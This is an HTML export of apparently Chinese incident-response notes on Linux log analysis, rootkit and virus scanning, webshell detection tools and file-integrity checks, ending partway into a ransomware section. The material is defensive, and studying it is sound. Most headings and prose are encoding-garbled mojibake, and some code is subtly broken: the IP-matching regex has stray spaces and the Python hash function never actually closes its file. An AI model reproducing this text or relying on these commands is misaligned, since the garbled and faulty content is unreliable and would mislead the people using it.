<div class="outline-text-4" id="text-org8f4e8fc">
<p>
æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/<br>
æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼šmore /etc/rsyslog.conf<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#26085;&#24535;&#25991;&#20214; &#35828;&#26126;
/var/log/cron &#35760;&#24405;&#20102;&#31995;&#32479;&#23450;&#26102;&#20219;&#21153;&#30456;&#20851;&#30340;&#26085;&#24535;

/var/log/cups &#35760;&#24405;&#25171;&#21360;&#20449;&#24687;&#30340;&#26085;&#24535;

/var/log/dmesg &#35760;&#24405;&#20102;&#31995;&#32479;&#22312;&#24320;&#26426;&#26102;&#20869;&#26680;&#33258;&#26816;&#30340;&#20449;&#24687;&#65292;&#20063;&#21487;&#20197;&#20351;&#29992;dmesg&#21629;&#20196;&#30452;&#25509;&#26597;&#30475;&#20869;&#26680;&#33258;&#26816;&#20449;&#24687;

/var/log/mailog &#35760;&#24405;&#37038;&#20214;&#20449;&#24687;

/var/log/message &#35760;&#24405;&#31995;&#32479;&#37325;&#35201;&#20449;&#24687;&#30340;&#26085;&#24535;&#12290;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;&#20013;&#20250;&#35760;&#24405;Linux&#31995;&#32479;&#30340;&#32477;&#22823;&#22810;&#25968;&#37325;&#35201;&#20449;&#24687;&#65292;&#22914;&#26524;&#31995;&#32479;&#20986;&#29616;&#38382;&#39064;&#26102;&#65292;&#39318;&#20808;&#35201;&#26816;&#26597;&#30340;&#23601;&#24212;&#35813;&#26159;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;

/var/log/btmp &#35760;&#24405;&#38169;&#35823;&#30331;&#24405;&#26085;&#24535;&#65292;&#36825;&#20010;&#25991;&#20214;&#26159;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#26597;&#30475;&#65292;&#32780;&#35201;&#20351;&#29992;lastb&#21629;&#20196;&#26597;&#30475;

/var/log/lastlog &#35760;&#24405;&#31995;&#32479;&#20013;&#25152;&#26377;&#29992;&#25143;&#26368;&#21518;&#19968;&#27425;&#30331;&#24405;&#26102;&#38388;&#30340;&#26085;&#24535;&#65292;&#36825;&#20010;&#25991;&#20214;&#26159;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#35201;&#20351;&#29992;lastlog&#21629;&#20196;&#26597;&#30475;

/var/log/wtmp &#27704;&#20037;&#35760;&#24405;&#25152;&#26377;&#29992;&#25143;&#30340;&#30331;&#24405;&#12289;&#27880;&#38144;&#20449;&#24687;&#65292;&#21516;&#26102;&#35760;&#24405;&#31995;&#32479;&#30340;&#21551;&#21160;&#12289;&#37325;&#21551;&#12289;&#20851;&#26426;&#20107;&#20214;&#12290;&#21516;&#26679;&#36825;&#20010;&#25991;&#20214;&#20063;&#26159;&#19968;&#20010;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#38656;&#35201;&#20351;&#29992;last&#21629;&#20196;&#26469;&#26597;&#30475;

/var/log/utmp &#35760;&#24405;&#24403;&#21069;&#24050;&#32463;&#30331;&#24405;&#30340;&#29992;&#25143;&#20449;&#24687;&#65292;&#36825;&#20010;&#25991;&#20214;&#20250;&#38543;&#30528;&#29992;&#25143;&#30340;&#30331;&#24405;&#21644;&#27880;&#38144;&#19981;&#26029;&#21464;&#21270;&#65292;&#21482;&#35760;&#24405;&#24403;&#21069;&#30331;&#24405;&#29992;&#25143;&#30340;&#20449;&#24687;&#12290;&#21516;&#26679;&#36825;&#20010;&#25991;&#20214;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#35201;&#20351;&#29992;w&#65292;who&#65292;users&#31561;&#21629;&#20196;&#26469;&#26597;&#35810;

/var/log/secure &#35760;&#24405;&#39564;&#35777;&#21644;&#25480;&#26435;&#26041;&#38754;&#30340;&#20449;&#24687;&#65292;&#21482;&#35201;&#28041;&#21450;&#36134;&#21495;&#21644;&#23494;&#30721;&#30340;&#31243;&#24207;&#37117;&#20250;&#35760;&#24405;&#65292;&#27604;&#22914;SSH&#30331;&#24405;&#65292;su&#20999;&#25442;&#29992;&#25143;&#65292;sudo&#25480;&#26435;&#65292;&#29978;&#33267;&#28155;&#21152;&#29992;&#25143;&#21644;&#20462;&#25913;&#29992;&#25143;&#23494;&#30721;&#37117;&#20250;&#35760;&#24405;&#22312;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;&#20013;
</pre>
</div>
<p>
å®‰å…¨äººå‘˜æ¯”è¾ƒå…³æ³¨çš„æ–‡ä»¶ï¼š /var/log/lastlog, /var/log/secure<br>
</p>

<p>
æ—¥å¿—åˆ†ææŠ€å·§ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#23450;&#20301;&#26377;&#22810;&#23569;IP&#22312;&#29190;&#30772;&#20027;&#26426;&#30340;root&#36134;&#21495;&#65306;
grep <span style="color: #8b2252;">"Failed password for root"</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $11}'</span> | sort | uniq -c | sort -nr | more

2&#12289;&#23450;&#20301;&#26377;&#21738;&#20123;IP&#22312;&#29190;&#30772;&#65306;
grep <span style="color: #8b2252;">"Failed password"</span> /var/log/secure | grep -E -o <span style="color: #8b2252;">"(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c

3&#12289;&#29190;&#30772;&#29992;&#25143;&#21517;&#23383;&#20856;&#26159;&#20160;&#20040;&#65311;
grep <span style="color: #8b2252;">"Failed password"</span> /var/log/secure|perl -e <span style="color: #8b2252;">'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}'</span> | uniq -c | sort -nr

4&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;IP&#26377;&#21738;&#20123;&#65306;
grep <span style="color: #8b2252;">"Accepted "</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $11}'</span> | sort | uniq -c | sort -nr | more

5&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;&#26085;&#26399;&#12289;&#29992;&#25143;&#21517;&#12289;IP&#65306;
grep <span style="color: #8b2252;">"Accepted "</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $1,$2,$3,$9,$11}'</span>
</pre>
</div>

<p>
æ‰‹å·¥æ’æŸ¥ï¼š<br>
</p>
<ul class="org-ul">
<li>æ£€æŸ¥ç¨‹åºçš„ç­¾åã€æè¿°ä¿¡æ¯<br></li>
<li>æŸ¥çœ‹ç¨‹åºçš„å¼•ç”¨æ–‡ä»¶æˆ–è€… DLL<br></li>
<li>ç½‘ç»œè¿æ¥<br></li>
<li>é€†å‘åˆ†æ<br></li>
</ul>
</div>
</div>
<div id="outline-container-org9e8beba" class="outline-4">
<h4 id="org9e8beba">å·¥å…·æŸ¥æ€</h4>
<div class="outline-text-4" id="text-org9e8beba">
</div>
<div id="outline-container-org4db1df5" class="outline-5">
<h5 id="org4db1df5">RootkitæŸ¥æ€</h5>
<div class="outline-text-5" id="text-org4db1df5">
<p>
rootkitæ˜¯ç‰¹æ®Šçš„æ¶æ„è½¯ä»¶ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯åœ¨ç›®æ ‡æœºå™¨ä¸Šå®‰è£…éšè—è‡ªèº«ä»¥åŠæŒ‡å®šçš„æ–‡ä»¶ã€è¿›ç¨‹å’Œç½‘ç»œè¿æ¥ç­‰ä¿¡æ¯ï¼Œæ¥å¸®åŠ©æ”»å‡»è€…åšä¸€äº›éšè—ã€‚æ¯”è¾ƒå¸¸è§çš„åœºæ™¯æ˜¯æœ¨é©¬åé—¨ç­‰å…¶å®ƒçš„æ¶æ„ç¨‹åºæ”¾åœ¨ä¸€èµ·ä½¿ç”¨ã€‚åœ¨å®é™…å·¥ä½œä¸­æ¯”è¾ƒéš¾é‡åˆ°ï¼Œå®ƒæ˜¯ä¸€ç§éšè—æ¶æ„ç¨‹åºã€éšè—è¿›ç¨‹ã€éšè—ç½‘ç»œçš„æ”»å‡»æ–¹å¼ã€‚<br>
</p>

<ul class="org-ul">
<li>chkrootkit<br></li>
</ul>
<p>
ç½‘å€ï¼š<a href="http://www.chkrootkit.org">http://www.chkrootkit.org</a><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20351;&#29992;&#26041;&#27861;&#65306;
wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
tar zxvf chkrootkit.tar.gz
<span style="color: #483d8b;">cd</span> chkrootkit-0.52
make sense
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#32534;&#35793;&#23436;&#25104;&#27809;&#26377;&#25253;&#38169;&#30340;&#35805;&#25191;&#34892;&#26816;&#26597;</span>
./chkrootkit
</pre>
</div>

<ul class="org-ul">
<li>rkhunter<br></li>
</ul>
<p>
ç½‘å€ï¼š<a href="http://rkhunter.sourceforge.net">http://rkhunter.sourceforge.net</a><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20351;&#29992;&#26041;&#27861;&#65306;
wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter- 1.4.4.tar.gz
tar -zxvf rkhunter-1.4.4.tar.gz
<span style="color: #483d8b;">cd</span> rkhunter-1.4.4
./installer.sh --install
rkhunter -c 
</pre>
</div>
</div>
</div>
<div id="outline-container-org072f7f5" class="outline-5">
<h5 id="org072f7f5">ç—…æ¯’æŸ¥æ€</h5>
<div class="outline-text-5" id="text-org072f7f5">
<ul class="org-ul">
<li>Clamav<br></li>
</ul>
<p>
ç½‘å€ï¼š<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a><br>
</p>

<p>
å®‰è£…æ–¹å¼ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;</span>
yum install -y epel-release

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20351;&#29992;&#38463;&#37324;&#20113;epel&#28304;</span>
wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo
yum clean all
yum makecache
yum install -y clamav

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26356;&#26032;&#30149;&#27602;&#24211;</span>
freshclam

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25195;&#25551;&#26041;&#27861;</span>
clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log
clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log
clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25195;&#25551;&#24182;&#26432;&#27602;</span>
clamscan -r --remove /usr/bin/bsd-port
clamscan -r --remove /usr/bin/
clamscan -r --remove /usr/local/zabbix/sbin

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#26085;&#24535;&#21457;&#29616;</span>
cat /root/etcclamav.log | grep FOUND
</pre>
</div>
</div>
</div>
<div id="outline-container-org6d30f3e" class="outline-5">
<h5 id="org6d30f3e">WebshellæŸ¥æ€</h5>
<div class="outline-text-5" id="text-org6d30f3e">
<p>
æ²³é©¬ WebShell æŸ¥æ€ï¼š<a href="http://www.shellpub.com">http://www.shellpub.com</a><br>
å®˜æ–¹æ–‡æ¡£è¯¦ç»†<br>
</p>
</div>
</div>
</div>
<div id="outline-container-org76245b2" class="outline-4">
<h4 id="org76245b2">å¸¸è§çš„WebShellæŸ¥æ€å·¥å…·</h4>
<div class="outline-text-4" id="text-org76245b2">
<p>
å½“ç½‘ç«™æœåŠ¡å™¨è¢«å…¥ä¾µæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ¬¾Webshellæ£€æµ‹å·¥å…·ï¼Œæ¥å¸®åŠ©æˆ‘ä»¬å‘ç°Webshellï¼Œè¿›ä¸€æ­¥æ’æŸ¥ç³»ç»Ÿå¯èƒ½å­˜åœ¨çš„å®‰å…¨æ¼æ´ã€‚<br>
ç½‘ç«™ä¸­æ­£å¸¸çš„ç³»ç»Ÿå‘½ä»¤ä¸€èˆ¬å†™åœ¨ä»£ç ä¸­ï¼Œä¸ä¼šåœ¨æµé‡ä¸­ä½“ç°ï¼Œç”±æ­¤æ¥å‘ç°ä¸å®‰å…¨æ“ä½œã€‚<br>
</p>
</div>
</div>
<div id="outline-container-orgcf7a7b7" class="outline-4">
<h4 id="orgcf7a7b7">Dç›¾_WebæŸ¥æ€</h4>
<div class="outline-text-4" id="text-orgcf7a7b7">
<p>
é˜¿Då‡ºå“ï¼Œä½¿ç”¨è‡ªè¡Œç ”å‘ä¸åˆ†æ‰©å±•åçš„ä»£ç åˆ†æå¼•æ“ï¼Œèƒ½åˆ†ææ›´ä¸ºéšè—çš„ WebShell åé—¨è¡Œä¸ºã€‚<br>
å…¼å®¹æ€§ï¼šåªæä¾› Windows ç‰ˆæœ¬ã€‚<br>
å·¥å…·ä¸‹è½½åœ°å€ï¼š<a href="http://www.d99net.net">http://www.d99net.net</a><br>
</p>
</div>
</div>
<div id="outline-container-org711faef" class="outline-4">
<h4 id="org711faef">ç™¾åº¦ WEBDIR+</h4>
<div class="outline-text-4" id="text-org711faef">
<p>
ä¸‹ä¸€ä»£ WebShell æ£€æµ‹å¼•æ“ï¼Œé‡‡ç”¨å…ˆè¿›çš„åŠ¨æ€ç›‘æµ‹æŠ€æœ¯ï¼Œç»“åˆå¤šç§å¼•æ“é›¶è§„åˆ™æŸ¥æ€ã€‚<br>
å…¼å®¹æ€§ï¼šæä¾›åœ¨çº¿æŸ¥æ€æœ¨é©¬ï¼Œå…è´¹å¼€æ”¾ API æ”¯æŒæ‰¹é‡æ£€æµ‹ã€‚<br>
åœ¨çº¿æŸ¥æ€åœ°å€ï¼š<a href="https://scanner.baidu.com/#/pages/intro">https://scanner.baidu.com/#/pages/intro</a><br>
</p>
</div>
</div>
<div id="outline-container-org810cca3" class="outline-4">
<h4 id="org810cca3">æ²³é©¬</h4>
<div class="outline-text-4" id="text-org810cca3">
<p>
ä¸“æ³¨ WebShell æŸ¥æ€ç ”ç©¶ï¼Œæ‹¥æœ‰æµ·é‡ WebShell æ ·æœ¬å’Œè‡ªä¸»æŸ¥æ€æŠ€æœ¯ï¼Œé‡‡ç”¨ä¼ ç»Ÿç‰¹å¾+äº‘ç«¯å¤§æ•°æ®åŒå¼•æ“<br>
çš„æŸ¥æ€æŠ€æœ¯ã€‚æŸ¥æ€é€Ÿåº¦å¿«ã€ç²¾åº¦é«˜ã€è¯¯æŠ¥ä½ã€‚<br>
å…¼å®¹æ€§ï¼šæ”¯æŒ Windowsã€Linuxï¼Œæ”¯æŒåœ¨çº¿æŸ¥æ€ã€‚<br>
å®˜æ–¹ç½‘ç«™ï¼š<a href="https://www.shellpub.com">https://www.shellpub.com</a><br>
</p>
</div>
</div>
<div id="outline-container-org033e6c5" class="outline-4">
<h4 id="org033e6c5">Web Shell Detector</h4>
<div class="outline-text-4" id="text-org033e6c5">
<p>
Web Shell Detector å…·æœ‰ WebShell ç­¾åæ•°æ®åº“ï¼Œå¯å¸®åŠ©è¯†åˆ«é«˜è¾¾ 99ï¼… çš„ WebShellã€‚<br>
å…¼å®¹æ€§ï¼šæä¾› PHPã€Python è„šæœ¬ï¼Œå¯è·¨å¹³å°ï¼Œåœ¨çº¿æ£€æµ‹ã€‚<br>
å®˜æ–¹ç½‘ç«™ï¼š<a href="http://www.shelldetector.com">http://www.shelldetector.com</a><br>
</p>
</div>
</div>
<div id="outline-container-orgf53e64c" class="outline-4">
<h4 id="orgf53e64c">CloudWalkerï¼ˆç‰§äº‘ï¼‰</h4>
<div class="outline-text-4" id="text-orgf53e64c">
<p>
ä¸€ä¸ªå¯æ‰§è¡Œå‘½ä»¤è¡Œç‰ˆæœ¬çš„ Webshell æ£€æµ‹å·¥å…·ã€‚<br>
å…¼å®¹æ€§ï¼šæš‚æ—¶åªæ”¯æŒ PHP Webshell çš„æ£€æµ‹ã€‚<br>
åœ¨çº¿æŸ¥æ€ demoï¼š<a href="https://webshellchop.chaitin.cn/demo/">https://webshellchop.chaitin.cn/demo/</a><br>
GitHub é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a><br>
</p>
</div>
</div>
</div>
<div id="outline-container-org4a398f8" class="outline-3">
<h3 id="org4a398f8">å¦‚ä½•å‘ç°éšè—çš„WebShellåé—¨</h3>
<div class="outline-text-3" id="text-org4a398f8">
<p>
å¦‚ä½•åœ¨ç™¾ä¸‡è¡Œä»£ç é‡Œå‘ç°éšè—çš„åé—¨ï¼Ÿ<br>
</p>

<p>
è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœä½ çš„ç½‘ç«™è¢«å…¥ä¾µï¼Œæ”»å‡»è€…ç•™ä¸‹éšè—çš„åé—¨ï¼Œä½ çœŸçš„éƒ½å¯ä»¥æ‰¾å‡ºæ¥å—ï¼Ÿé¢å¯¹ä¸€ä¸ªå¤§ä¸­å‹çš„åº”ç”¨ç³»ç»Ÿï¼Œæ•°ä»¥ç™¾ä¸‡çº§çš„ä»£ç è¡Œï¼Œæ˜¯ä¸å¯èƒ½åšåˆ°æ¯ä¸ªæ–‡ä»¶æ¯æ®µä»£ç è¿›è¡Œæ‰‹å·¥æ£€æŸ¥çš„ã€‚å³ä½¿æ˜¯ä¸€æ¬¾æ‹¥æœ‰99.9% çš„ Webshell æ£€å‡ºç‡çš„æ£€æµ‹å¼•æ“ï¼Œä¾ç„¶å¯èƒ½å­˜åœ¨ Webshell ç»•è¿‡çš„æƒ…å†µã€‚å¦å¤–ï¼Œåƒæš—é“¾ã€ç½‘é¡µåŠ«æŒã€é¡µé¢è·³è½¬ç­‰å¸¸è§çš„é»‘å¸½ SEO æ‰‹æ³•ï¼Œä¹Ÿå¾ˆéš¾é€šè¿‡æ‰‹åŠ¨æ£€æµ‹æˆ–å·¥å…·æ£€æµ‹å…¨éƒ¨è¯†åˆ«å‡ºæ¥ã€‚<br>
</p>

<p>
æœ€å¥½çš„æ–¹å¼å°±æ˜¯åšæ–‡ä»¶å®Œæ•´æ€§éªŒè¯ã€‚é€šè¿‡ä¸åŸå§‹ä»£ç å¯¹æ¯”ï¼Œå¯ä»¥å¿«é€Ÿå‘ç°æ–‡ä»¶æ˜¯å¦è¢«ç¯¡æ”¹ä»¥åŠè¢«ç¯¡æ”¹çš„ä½ç½®ã€‚å½“ç„¶ï¼Œå‰ææ˜¯è¦å…·å¤‡ä»£ç ç‰ˆæœ¬ç®¡ç†çš„èƒ½åŠ›ã€‚<br>
</p>

<p>
ä¸‹åˆ—å‡ ç§æ–‡ä»¶å®Œæ•´æ€§éªŒè¯æ–¹å¼ï¼Œå¯ä»¥æ‰¾å‡ºä»£ç ä¸­æ‰€æœ‰éšè—çš„åé—¨ã€‚<br>
</p>
</div>
<div id="outline-container-orgaa035a6" class="outline-4">
<h4 id="orgaa035a6">MD5æ ¡éªŒ</h4>
<div class="outline-text-4" id="text-orgaa035a6">
<p>
ä¸‹è½½Dç›¾_WebæŸ¥æ€å·¥å…·çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç•™æ„åˆ°ä¸‹è½½çš„å‹ç¼©åŒ…é‡Œæœ‰ä¸€ä¸ª exe å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‹¥æœ‰è‡ªèº«çš„md5 å€¼ã€‚è¿™ä¸ªæ˜¯è½¯ä»¶ä½œè€…åœ¨å‘å¸ƒè½¯ä»¶æ—¶ï¼Œé€šè¿‡ md5 ç®—æ³•è®¡ç®—å‡ºè¯¥ exe æ–‡ä»¶çš„"ç‰¹å¾å€¼"ã€‚<br>
</p>

<p>
ä¸‹è½½åœ°å€ï¼š<a href="https://www.d99net.net/down/d_safe_2.1.7.2.zip">https://www.d99net.net/down/d_safe_2.1.7.2.zip</a><br>
æ–‡ä»¶ MD5ï¼še2ec949fd70c4c921ee38979dda39d11 D_Safe_Manage.exe<br>
</p>
<div class="org-src-container">
<pre class="src src-nil">C:\Users\jasper\d_safe_2.1.7.2&gt;certutil -hashfile D_Safe_Manage.exe MD5
MD5 hash of D_Safe_Manage.exe:
e2ec949fd70c4c921ee38979dda39d11
CertUtil: -hashfile command completed successfully.
</pre>
</div>

<p>
å½“ç”¨æˆ·ä¸‹è½½è½¯ä»¶æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ ¡éªŒç®—æ³•è®¡ç®—ä¸‹è½½åˆ° exe æ–‡ä»¶çš„ç‰¹å¾å€¼ï¼Œå¹¶ä¸è½¯ä»¶å¼€å‘è€…å‘å¸ƒçš„ç‰¹å¾å€¼æ¯”è¾ƒã€‚å¦‚æœä¸¤ä¸ªç‰¹å¾å€¼ç›¸åŒï¼Œåˆ™è®¤ä¸ºä¸‹è½½åˆ°çš„ exe æ–‡ä»¶æ˜¯æ­£ç¡®çš„ã€‚å¦‚æœä¸¤ä¸ªç‰¹å¾å€¼ä¸åŒï¼Œåˆ™è®¤ä¸ºä¸‹è½½åˆ° exe æ–‡ä»¶æ˜¯è¢«ç¯¡æ”¹è¿‡çš„ã€‚<br>
</p>

<p>
é‚£åŒç†å¯å¾—ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰ç½‘ç«™æ–‡ä»¶è®¡ç®—ä¸€æ¬¡ hash å€¼ä¿å­˜ï¼Œå½“å‡ºç°åº”æ€¥æƒ…å†µæ—¶ï¼Œé‡æ–°è®¡ç®—ä¸€æ¬¡ hashå€¼ï¼Œå¹¶ä¸ä¸Šæ¬¡ä¿å­˜çš„ hash å€¼è¿›è¡Œå¯¹æ¯”ï¼Œä»è€Œè¾“å‡ºæ–°åˆ›å»ºçš„ã€ä¿®æ”¹è¿‡åŠåˆ é™¤çš„æ–‡ä»¶åˆ—è¡¨ã€‚<br>
</p>

<p>
æ–‡ä»¶ hash å€¼è®¡ç®—ï¼š<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">md5sum</span>(<span style="color: #483d8b;">file</span>):
    <span style="color: #a0522d;">m</span>=hashlib.md5()
    <span style="color: #a020f0;">if</span> os.path.isfile(<span style="color: #483d8b;">file</span>):
        <span style="color: #a0522d;">f</span>=<span style="color: #483d8b;">open</span>(<span style="color: #483d8b;">file</span>,<span style="color: #8b2252;">'rb'</span>)
        <span style="color: #a020f0;">for</span> line <span style="color: #a020f0;">in</span> f:
            m.update(line)
        f.close
    <span style="color: #a020f0;">else</span>:
        m.update(<span style="color: #483d8b;">file</span>)
    <span style="color: #a020f0;">return</span> (m.hexdigest())
</pre>
</div>

<p>
å¯¹æ–‡ä»¶è¿›è¡Œå“ˆå¸Œå€¼é‡æ–°è®¡ç®—ï¼Œè¿›è¡Œæ ¡éªŒå¯¹æ¯”ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-orgf5032d9" class="outline-4">
<h4 id="orgf5032d9">diff å‘½ä»¤</h4>
<div class="outline-text-4" id="text-orgf5032d9">
<p>
åœ¨ Linux ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ diff å‘½ä»¤æ¥æ¯”è¾ƒä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶çš„å·®å¼‚ã€‚åŒæ ·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€è¡Œå‘½ä»¤å¿«é€Ÿæ‰¾å‡ºä¸¤ä¸ªé¡¹ç›®æ–‡ä»¶çš„å·®å¼‚ã€‚<br>
</p>

<p>
-a diffé¢„è®¾åªä¼šé€è¡Œæ¯”è¾ƒæ–‡æœ¬æ–‡ä»¶<br>
-c ä¸Šä¸‹æ–‡æ ¼å¼ï¼ˆcontext diff)<br>
-r æ¯”è¾ƒå­ç›®å½•ä¸­çš„æ–‡ä»¶<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">diff -c -a -r 2.php 3.php
</pre>
</div>


<figure id="org0cc7a3a">
<img src="./images/img_20230814_162712.png" alt="img_20230814_162712.png" width="60%"><br>

</figure>

<p>
å¦‚æœåªæ˜¯æƒ³æŸ¥çœ‹ä¸¤ä¸ªæ–‡ä»¶æ˜¯å¦ä¸åŒåˆä¸æƒ³æ˜¾ç¤ºå·®å¼‚ä¹‹å¤„çš„è¯ï¼Œå¯ä»¥åŠ ä¸Š -q é€‰é¡¹ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org4c34611" class="outline-4">
<h4 id="org4c34611">æ–‡ä»¶å¯¹æ¯”å·¥å…·</h4>
<div class="outline-text-4" id="text-org4c34611">
<p>
å…³é”®è¯ï¼šä»£ç å¯¹æ¯”å·¥å…·ï¼Œä½ ä¼šæ‰¾åˆ°å¾ˆå¤šå¥½ç”¨çš„å·¥å…·ï¼Œè¿™é‡Œæˆ‘ä»¬æ¨èä¸¤æ¬¾æ•ˆæœè¿˜ä¸é”™çš„å·¥å…·ï¼ŒBeyond Compare å’Œ WinMergeã€‚<br>
</p>

<p>
<b>Beyond Compare</b><br>
</p>

<p>
Beyond Compare æ˜¯ä¸€å¥—ç”± Scooter Software æ¨å‡ºçš„æ–‡ä»¶æ¯”è¾ƒå·¥å…·ã€‚ä¸»è¦ç”¨é€”æ˜¯å¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶å¤¹æˆ–è€…æ–‡ä»¶ï¼Œå¹¶å°†å·®å¼‚ä»¥é¢œè‰²æ ‡ç¤ºï¼Œæ¯”è¾ƒèŒƒå›´åŒ…æ‹¬ç›®å½•ï¼Œæ–‡æ¡£å†…å®¹ç­‰ã€‚<br>
</p>

<p>
ä¸‹è½½åœ°å€ï¼š<a href="http://www.scootersoftware.com/download.php">http://www.scootersoftware.com/download.php</a><br>
</p>

<p>
è½¯ä»¶ä½¿ç”¨ç¤ºä¾‹ï¼Œé€šè¿‡æ–‡ä»¶å¤¹æ¯”è¾ƒï¼Œæ‰¾å‡ºæ–‡ä»¶å¤¹ä¸­çš„å·®å¼‚å†…å®¹ï¼šåŒå‡» Beyond Compare ï¼Œæ‰“å¼€è½¯ä»¶ä¸»é¡µï¼Œé€‰æ‹©æ–‡ä»¶å¤¹æ¯”è¾ƒï¼Œåˆ†åˆ«åŠ è½½ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œç›´æ¥æ¯”è¾ƒå³å¯ã€‚<br>
</p>


<figure id="orgb8283a0">
<img src="./images/img_20230814_162915.png" alt="img_20230814_162915.png" width="60%"><br>

</figure>

<p>
<b>WinMerge</b><br>
</p>

<p>
WinMerge æ˜¯ä¸€æ¬¾è¿è¡Œäº Windows ç³»ç»Ÿä¸‹çš„æ–‡ä»¶æ¯”è¾ƒå’Œåˆå¹¶å·¥å…·ï¼Œä½¿ç”¨å®ƒå¯ä»¥éå¸¸æ–¹ä¾¿åœ°æ¯”è¾ƒæ–‡ä»¶å¤¹å’Œæ–‡ä»¶ï¼Œä»¥æ˜“äºç†è§£çš„å¯è§†æ–‡æœ¬æ ¼å¼æ˜¾ç¤ºå·®å¼‚ã€‚<br>
</p>

<p>
ä¸‹è½½åœ°å€ï¼š<a href="https://winmerge.org/downloads/">https://winmerge.org/downloads/</a><br>
</p>


<figure id="org49a7eb2">
<img src="./images/img_20230814_162934.png" alt="img_20230814_162934.png" width="60%"><br>

</figure>

<p>
1ã€æ–‡ä»¶ &#x2013; æ‰“å¼€ï¼Œé€‰æ‹©æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼Œç„¶åç‚¹å‡»è¿›è¡Œæ¯”è¾ƒã€‚<br>
2ã€åœ¨åŒä¸€ä¸ªç•Œé¢é‡Œï¼Œé€šè¿‡é¢œè‰²å’Œæ–‡æœ¬æç¤ºï¼Œæ˜¾ç¤ºæ–‡ä»¶å¤¹å†…å®¹å·®å¼‚ã€‚<br>
</p>
</div>
</div>
</div>
<div id="outline-container-org434bb0c" class="outline-3">
<h3 id="org434bb0c">å‹’ç´¢ç—…æ¯’è‡ªæ•‘æŒ‡å—</h3>
<div class="outline-text-3" id="text-org434bb0c">
</div>
<div id="outline-container-org7ed2d49" class="outline-4">
<h4 id="org7ed2d49">å‹’ç´¢ç—…æ¯’åŠ å¯†åŸç†</h4>
<div class="outline-text-4" id="text-org7ed2d49">

<figure id="org0336008">
<img src="./images/img_20230814_163012.png" alt="img_20230814_163012.png" width="60%"><br>

</figure>

<p>
<b>åŸç†</b><br>
</p>

<p>
å…¬å¼€å¯†é’¥å¯†ç ä½“ç³»è¦æ±‚å¯†é’¥æˆå¯¹å‡ºç°ï¼Œä¸€ä¸ªç”¨äºåŠ å¯†ï¼Œå¦ä¸€ä¸ªç”¨äºè§£å¯†ï¼Œå¹¶ä¸”ä¸å¯èƒ½ä»å…¶ä¸­ä¸€ä¸ªæ¨å¯¼å‡ºå¦ä¸€ä¸ªã€‚<br>
</p>

<p>
<b>åŠ å¯†è¿‡ç¨‹</b><br>
1ã€ç—…æ¯’ä½œè€…é¦–å…ˆåœ¨è‡ªå·±ç”µè„‘ä¸Šç”Ÿæˆçš„ ç§é’¥Q å’Œ å…¬é’¥Q<br>
2ã€ç—…æ¯’åœ¨ç›®æ ‡ç”µè„‘ä¸Šéšæœºç”Ÿæˆ ç§é’¥Z å’Œ å…¬é’¥Z<br>
